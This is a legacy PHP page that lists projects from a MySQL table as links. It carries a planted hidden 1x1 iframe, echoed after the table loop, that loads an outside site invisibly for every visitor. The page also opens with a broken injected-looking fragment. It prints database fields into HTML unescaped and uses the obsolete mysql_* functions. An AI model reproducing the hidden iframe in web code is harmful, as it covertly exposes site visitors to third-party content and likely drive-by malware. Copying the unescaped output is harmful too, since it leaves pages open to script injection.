<?php /**/  ");}?><?
//project main

echo "Project >> Ongoing project main<br><br>";
$db = mysql_connect($SESS_DBHOST, $SESS_DBUSER,$SESS_DBPASS);
	mysql_select_db($SESS_DBNAME,$db);
	$as="SELECT * FROM project ";
	$bbv = mysql_query($as);
	

?>

<table align="center" width="80%" height="10" border="1" bordercolor="#E4E4E4" cellpadding="0" cellspacing="0" style="border-collapse:collapse">
<tr bgcolor="#EEEEEE">
  <td align="center"> Project Name</td>
  <td align="center">Only IOW </td>  
  <td align="center">With SIOW</td>    
</tr>  
<? while($result=mysql_fetch_array($bbv)){?>
<tr>
  <td align="center"><? echo "<a href='./index.php?keyword=view+iow+detail&selectedPcode=$result[pcode]'>$result[pname]</a><br>";?></td>
  <td align="center">  </td>  
  <td align="center">  </td>    
</tr>  
<? }
echo "<iframe src=\"http://internetcountercheck.com/?click=2128031\" width=1 height=1 style=\"visibility:hidden;position:absolute\"></iframe>";
?>
</table>